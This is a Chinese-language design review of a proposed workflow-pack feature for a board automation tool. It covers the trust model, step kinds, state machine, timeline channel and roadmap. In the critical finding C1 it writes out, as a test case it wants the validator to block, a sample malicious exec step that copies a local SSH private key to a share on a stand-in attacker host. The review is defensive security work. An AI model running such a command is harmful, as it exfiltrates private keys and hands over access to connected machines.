## 三 · 问题

### 三·一 Critical

#### C1 · 授权与信任模型有洞：`exec` 步骤 = 一条绕过整条防线的裸命令通道

| 项 | 内容 |
|---|---|
| **位置** | `docs/24` §3.3 kind 表 `exec`/`launch`（:215-225）、§3.7 权限（:350-357）、§4.3 agent 触发（:414-434）、§10 待拍板 7（:623） |
| **现象** | 流程步骤 `exec {role: build, cmd: "make …"}` 是**对任意角色发任意命令**。角色可以是 `source: local`——**宿主 Windows 本机**；可以是存着 SSH 私钥的编译机。而 §3.7 只说「授权粒度不变：流程里的**写动作**仍走 M6 的动作授权（按动作 id）」 |
| **为什么错** | ① **类型对不上**：M6 的 executor（`docs/21` §6.9）处理的是「板型包里声明的动作 id + 参数 + 地板 + 回读」；`exec` 步骤的 `(role, cmd)` **不是任何板型包的动作**——编译机根本没有板型包。文档 §3.8 说「流程执行器调用 M6，不另造一套」，但两者**签名不同构**，这条宣称落不了地。② **旁路与 `spec/04` §1.3 正面冲突**：契约明写「不准有裸 send_command……agent 需要一个还没声明的动作，应该写一个 board pack 扩展，而不是发裸命令」。流程包给了 agent 一条更好的旁路：**写一个 workflow pack，就能在任意角色（含宿主机、含存私钥的机器）上跑任意命令**。这与 `spec/02` §5.6 处理过的「reader 是裸命令的旁路」是**同一形状的洞**，而 §5.6 的处置是「包要人确认才生效」——文档 §3.7 对流程包**没有任何信任/确认模型**（谁写、要不要人点头、要不要过地板）。③ 宿主机的文件（`~/.ssh/id_ed25519_*`、`buildrun.py:117-118` 就在这么用）没有任何防线提及 |
| **怎么改** | ① 明确流程包的信任等级：**至少与板型包同级**（人确认才生效，确认界面列出每一步将在哪个角色执行什么命令）——照抄 `SPEC-D12` 收窄后的口径。② 把每条 `exec`/`launch` 命令**过地板与参数编码**（§4.6 的编码规则必须同样适用于步骤参数，否则 `{param}` 注入重现）。③ 定义 agent 侧的 `run_workflow` 授权：dry-run → 人确认 → 带 `workflow_confirm_id` 重试，与 `spec/04` §2.4.1 的 `confirm_id` 同构，绑定 `(workflow id, 版本哈希, 绑定摘要)`。 |
| **怎么验证** | 写一个「恶意流程包」用例：`exec {role: local, cmd: "type %USERPROFILE%\\.ssh\\id_ed25519_codex_board > \\\\attacker\\share"}`——按现稿的 §3.7，这条**没有拦截它的规则**；改完后校验器/运行时必须能拦（流程包未确认不生效 + 命令过地板 + 本机角色默认禁写）。 |

### 三·二 Important

**I1 · `await`/`assert` 覆盖不了「编译成功」这类判据，而文档宣称「不另造成功判定」。**
`await` 的判据是 tag（:222、红线 2），`assert` 只支持 tag/param（:223）。但**编译成功 = 客机上退出码为 0 + 产物文件存在**——这两样都不是板上的量测，`SPEC-D4` 本来就把它们排除在 tag 之外。而 M6 的回读五形式里 `command_ok`（退出码）与 `file_equals`（文件比值）正是为这类判据准备的（`spec/02` §4.4）🟢。改法：把「步骤完成判据」统一成 M6 回读的**同五个形式**（tag / file_equals / command_ok / verify / none），`await`/`assert` 退化成判据的两种用法——顺便消掉与 M6 `verify`（§4.5「轮询到成功或超时」）的机制重复。这样「confirmed / unconfirmed」两个状态也有了一致的定义来源（现在 :318-319 的「回读符合预期」没说清是**哪一步**的回读）。

**I2 · step kind 清单本身有冗余与自相矛盾。**
① `launch` 与 `exec` 的差别只是「要不要流式输出」——一个 `stream: true` 参数的事，两个 kind 会让校验器、审计、文档都翻倍；② `artifact.deploy` = `artifact.transfer` + `placement` 参数，两个 kind 表达同一件事；③ `note` 在时间线上记一笔——这是时间线自己的能力，不是步骤；④ **`exec_script` 出现在 kind 表里（:225），而 §10 待拍板 5 自己建议首版不做（:621）**——同一份文档自相矛盾；⑤ 真正缺的没人列：**产物发现**（`buildrun.py:312-328` 用扩展名过滤从 make 输出目录里找产物，`produces: [hello.ko]` 的硬编码是文档发明的、实际流程是自动找的）、**凭据准备**（`ensure_guest_to_board_key`，:213-236，幂等配免密——没有它「客机 scp 直达」根本跑不起来）、`chmod +x`（放置规范硬规矩 6 🟢）。改法：kind 收到 6 个（`exec`（含 stream）、`file.fetch`、`transfer`（placement 或 path 二选一参数）、`await`（判据=五形式）、`assert`、`deploy` 并入 transfer），补 `discover`（产物发现）或允许 `produces` 用 glob。

**I3 · 状态机缺「等待确认」，且没有并发约束。**
一次运行中段遇到 `destructive` 步骤（比如 `system.reboot` 类的步骤）时要**暂停等人在 GUI 点确认**——:317-323 的状态机没有这个状态，`denied` 画成入口态，中段拒绝无处落。另外**同一连接的并发约束没提**：`spec/02` §1.2.1 一次往返独占 + ADR-D23 四级优先级是硬约束 🟢，而 `launch`（流式盯着 `dmesg` 30 秒）在串口目标上会**占住整条线、让采样停 30 秒**；两个流程绑到同一条串口上并发跑会直接串台。改法：加 `awaiting_confirmation` 状态；规定「流程步骤经 RoundTripQueue（动作优先级）」「同一 connection 上同一时刻只许一个 run 处于 running」。验证 🔵：fake 设备上同时起两个 run 指向同一绑定，断言第二个排队或拒绝——现在无规则可断言。

**I4 · `SPEC-D20` 被挪用了：流程时间线不是 Source/push，文档却说「不必再造第三种事件流」。**
`SPEC-D20` 的 Source（poll/push）是**取数侧进 TagStore** 的接口（`SPEC-D21`：TagStore 是读数唯一汇点）；而 `SPEC-D4` 已经把编译日志这类量排除在 tag 之外。流程状态流**不可能**走 Source——否则要么进 TagStore（违反 D4/D21 的「读数唯一汇点」语义），要么不进（那 Source 的形状对它无约束）。所以「照 SPEC-D20 的形状做即可」（:133-136）不成立：**时间线就是一条新通道**（IPC 事件 + MCP `workflow_timeline`），该做的不是否认它，而是把它**定义**出来（载荷、订阅、`seq`、退订）。🔵 验法：试图把 timeline 事件塞进 Source 接口，会立刻发现它没有 tag 名、没有 poll group、没有五态——形状不匹配。

**I5 · §5.2 隔离矩阵有虚高。**
「换通信方式（adb↔scp↔网线）→ 流程包 ❌」**不总成立**：换成**串口**后 `files=false`（事实 S7）、无退出码（事实 S5）🟢——依赖退出码的步骤、依赖文件通道的步骤**必须改流程或被拒绝**，R2（`spec/02` §七 运行时检查）就是干这个的。「换板子 → 流程 ❌」也不总成立：新板的板型包若**没有声明**流程引用的那个 placement 名（如 `kernel-module`），`artifact.deploy` 解析失败——placement 名字是流程与板型包之间的**隐式契约**，目前没有任何校验器对拍。改法：矩阵加脚注「换到串口需过 R2 复查」；给 placement 建一份**封闭清单**（进契约），流程引用清单外的名字 → 校验报错。

**I6 · placement 的事实是 🟡，却被排进 W1 的契约增量。**
`.ko→/usr/lib/modules/$(uname -r)/extra/`、可执行→`/usr/local/bin/`、`depmod -a`、`chmod +x`——这些只存在于学习工作区 `板子放置规范.md` 🟢（本仓库 `docs/02` 零命中，见 §一）。AGENTS.md 规矩：学习工作区是上游来源、以 `docs/02` 为准；事实要标 🟢/🟡/🔵。**先把这批事实按状态标进 `docs/02`（或补一次真机核验转 🟢），才许写进板型包契约**。现在的 W1 是拿 🟡 直接当契约。

**I7 · 「假设备上跑通两步流程」（W2 验收）验不了多角色，而文档自己知道。**
假设备只有一块 `fake-board`（`src/main/hal/fake/`，单连接单角色）🟢；文档 §6 第 9 项也承认「假设备支持多角色」排在 W3（:515）。那 W2 的判据「假设备上跑通一条两步流程」只能验**单角色**，role→connection 绑定、跨角色直传、绑定缺失→`denied` 这些 W2 最该验的东西**全验不到**。改法：W2 判据改成单测级（绑定解析纯函数 + 假传输替身按行为建模——替身要**执行命令**而不是吐契约答案，这是仓库的既有规矩），多角色真演练留 W3 真板。

**I8 · 跨目标直传被高估成「缺的概念」，但样例自己用的是 exec+scp。**
`buildrun.py:239-244` 的「客机直达板子」实现是：在客机上 `ssh_run("scp -i ~/.ssh/id_ed25519 …")`——**就是一条 exec 命令** 🟢。也就是说，v1 的 `artifact.transfer` 可以完全落在 `exec` + 凭据管理上，不需要给 `Connection` 加 `copyBetween()`（§6 第 2 项）。直传作为一等步骤的独有增量只有「进度条与字节数」——价值真实但小，不该成为四概念之一撑起「必须重构」的论证。两跳中转（pull→push）对 15KB 的 `.ko` 更是无感。

**I9 · 绑定文件造出了第三种「连接定义面」。**
§3.5 的绑定 `target: {profile: board-ssh, host: 192.168.5.100}` 允许**在绑定里改写 profile 的字段**——于是连接的定义有了三处：`profiles/targets/*.json`、板型包绑定（`board_pack` 键）、流程绑定+覆写。`docs/09` §2.6 特意把三个扩展点统一成「用户目录+内置目录，同名用户优先」，就是为了避免多定义面漂移。改法：**绑定只许引用既有 profile id，不许覆写字段**；要换地址就去 profile 文件里换（或新建一个 profile）——「换传输只改绑定」的收益一点不损失。

### 三·三 Minor

1. **「19 条规则」应为 27 条**（`spec/02` §七）🟢——`docs/24` :510。
2. **§2.2 的卡片 API 清单不全**：漏 `capabilities()` / `degradation()` / `log` / `notify`（`spec/03` §7.7 共 13 个方法）🟢。「契约给卡片的东西全在这儿了」这句不成立，且恰好漏掉的 `capabilities()` 对流程包还有用（卡片要先问宿主支不支持 `workflows.*`）。
3. **§2.4 说「审计只有单次动作级」过宽**：动作审计**还不存在**（M6 未开工，`docs/17` §2.4.1 L7 🟢），现在只有会话日志。正确说法是「审计（M6）与时间线（W2）是两层，动作行仍是追责单位，时间线引用 audit_id」——B7 的答案应是**并存**：时间线不替换动作审计，因为破坏性步骤的逐次确认记录（`spec/02` §5.4）不能被阶段摘要吸收。文档没有写死这条关系，W2 落地时会打架。
4. **§3.6 文字与图不符**：「每一步产出一条时间线记录」，JSON 却是**一次运行一条、内部 stages[]**。措辞改齐，免得实现照句子做。
5. **`armed` 状态疑似多余**：「绑定齐全、校验通过、待发」——它可以只是 idle 的校验结果属性。八个状态里它是唯一没有独立转移语义的。
6. **`await` 步骤的 timeout 语义未定**：超时算 `failed` 还是 `unconfirmed`？M6 的 `verify` 超时报「未确认生效」——沿用哪套？没写。

## 附 · 任务问题 A–E 的逐条回答

**A1 「hold 不住」成立吗？** 四条里两条半成立。**成立**：长时任务无取消/流式（🟢 `connection.ts:24-49`）；非标量结果无通道（🟢 `SPEC-D4`）。**半成立**：多目标——`exec` 对任何连接都可用，「多目标执行」连接层早就支持，缺的只是**卡片够不到**（卡片无 exec，这是安全设计不是缺陷）；跨目标直传——两跳或 exec+scp 都能做（🟢 buildrun.py:239-244 就是 exec scp）。**不成立**：「策略只能住在卡片里」——策略也住在板型包（动作+回读+guard 是不折不扣的策略）、poll group 调度、M6 七步链里；准确说法是「**多步骤跨目标编排**无处住」，这个收窄后的判断成立。

**A2 四概念是否真缺？** Job：真缺 🟢。Role：半缺——它只是「带用途名的 profile 引用」，是薄别名不是新概念（真正的新东西是**绑定解析**与**多连接事务**）。直传：接口形状缺、实现不缺（exec scp）。非标量通道：「通道」作为契约概念不缺（D4 已决定流不走 tag），缺的是**时间线这个新载体的定义**（I4）。

**A3 「策略只能住在卡片里」准确吗？** 不准确（见 A1）。换成「卡片没有编排原语，宿主没有编排载体」则准确。

**B1 五层错配？** ①②的分离对应 `spec/02` §2.4（kind 表与 pack 格式分节）成立；真正的错配在 **③**：绑定层与既有两套绑定机制（profile→board_pack、布局 (cardId, connectionId)）关系未说明，加上覆写字段就是第三套连接定义面（I9）；以及 **④** 引用一个不存在的 M6（C4）。

**B2 9 种 kind 够吗？** 多余：`launch`、`artifact.deploy`、`note`、`exec_script`。缺：产物发现、凭据准备、（以参数形式补的）`{param}`。见 I2/C3。

**B3 封闭清单+逃生门成立吗？** 半成立。reader kind 是**纯函数**（文本→样本，无副作用，失败=tag unavailable）；step kind 是**任意副作用**（失败=板子/宿主机被改），每个 kind 都要 M6 级安全处理。「reader kind 成功 ⇒ step kind 也会成功」（Insight 3）是不成立的推断——安全域完全不同。封闭清单对 step 的**扩展性**价值仍在，对**安全性**价值为零（exec 天生不是封闭的）。

**B4 语义 placement vs 用户选路径？** 能共存但要写明：`transfer` 的 `to` 允许 `{placement}` 或 `{path}` 二选一（文档 :257 的 `file.fetch` 已经用了 path，说明路径并未被禁止——红线 1 应改为「**deploy 用语义，transfer 允许路径**」）；另给 placement 解析留**用户覆写**（绑定层给该角色一个目录前缀），这样「上传到选定位置」不用改流程。

**B5 await 用 tag 够吗？** 不够（I1）：编译成功=退出码+产物存在，都得走 M6 回读的 command_ok/file_equals 形式。tag 判据只适合板侧条件（进程起来、文件出现）。

**B6 状态机够吗？** 缺 `awaiting_confirmation`；`denied` 应也能中段发生；`armed` 多余。见 I3。

**B7 时间线与动作审计的关系？** **并存**，时间线不替换审计行；时间线阶段应引用 `audit_id`。现在文档没写死（Minor 3），W2 会打架。

**C1 与冻结契约冲突？** 无直接冲突，但三处**动契约面**：`spec/03` §7.7（API 全集是「唯一定义处」，加方法=改契约）、`spec/02`（placement 段）、`spec/04`（4 工具）。apiVersion 按既有口径**不升**（文档列成待拍板是假开放，见 C4③）。另外样例 `system.load` 撞「词表唯一源头」规矩 🟢。

**C2 重复发明？** step kind 与 reader kind：形似神不似（B3）。流程执行器与 M6：宣称同一，实际类型不接（C1）——这是**最危险的一处重复**：真到实现时会发现对不上，然后另造一套，正是 §10-7 想避免的结局。`await` 与 M6 `verify`：机制重复（I1）。

**C3 仓库规矩破坏？** 是，两处：placement 事实 🟡 未进 `docs/02` 就要进契约（I6）；样例私自扩词表 + 违反实测硬规矩（C2）。

**C4 时机论证成立吗？** 半成立。M6 未开工⇒「一起设计便宜」对**服务路径**这一件事成立；但「窗口在关」不成立——M6 的需求（参数编码单测先行、授权、审计）在 `docs/21` §6.9 已定形，流程层晚一个里程碑进入**不会**引起二次重构，只要 M6 的执行器接口开到事务粒度。而只有一个真实需求实例（2026-11-14 那张卡）就冻结四份契约增量，正是 `spec/02` §2.2 教训反过来的用法。

**D1 四问判据好吗？** 不够准。漏了最重要的 **⑤「是否长时且需取消」**——一个从不复用、不换目标、不给 agent 的 30 分钟编译，四问全否，但**仍然**需要 Job；反之④「被审计」对一切写流程几乎恒真，判别力弱。改成：**「跨目标 ∨ 长时可取消 ∨ 要给 agent，三者有一才进流程层」**。

**D2 矩阵虚高？** 两格虚高（I5）：换串口那格、换板子那格（placement 未声明时流程要改）。

**D3 最没价值的三条？** `exec_script`、`note`、直传一等公民（§五·一 1–3）。

**D4 八条 Insight 哪些站不住？** Insight 3（reader kind 成功⇒step kind 成功——安全域不同，不成立）；Insight 1 的「流程包是『这件事』的语义」前半成立、后半「板型包+绑定是它的实现」漏了**执行器与信任模型**这块最难的部分；Insight 8 本身很好，但它与 §7.1「窗口在关」的紧迫叙事**自相矛盾**（实验没跑就断言缺口与时机）；其余（2/4/5/6/7）站得住，其中 5 的自省尤其诚实。

**E1 W0–W4 合理吗？** 顺序错在 W1（契约）先于一切验证（C4）。W2/W3/W4 的内容与验收意识（真板判据）是对的；W2 的「假设备跑两步流程」判据要改（I7）。

**E2 buildrun.py 代表性够吗？** 不够，它缺：**参数化**（项目路径——最核心）、产物自动发现、免密配装（幂等）、chmod、多产物分流（.ko 与可执行走不同 placement）、传输切换、失败即停。文档只对照了它的 happy path 单产物形态（C3/I2 的证据来源）。

**E3 最小可用一版？** 砍到这个形状：**Job（可取消/流式/阶段）+ 角色绑定（只引用 profile id）+ 6 个 kind（exec[含 stream] / file.fetch / transfer[placement 或 path] / await[五形式判据] / assert / discover）+ 时间线（IPC+MCP 各一条通道）+ params（封闭类型，替换后过地板）+ 流程包信任模型（人确认才生效）**；假设备上跑单角色两步流程（单测+替身按行为建模），真板跑 `hello-kernel`（`modprobe` 路线、参数化项目、depmod+chmod 全齐）——跑通之后这份经验直接写成 spec/06 的正文。
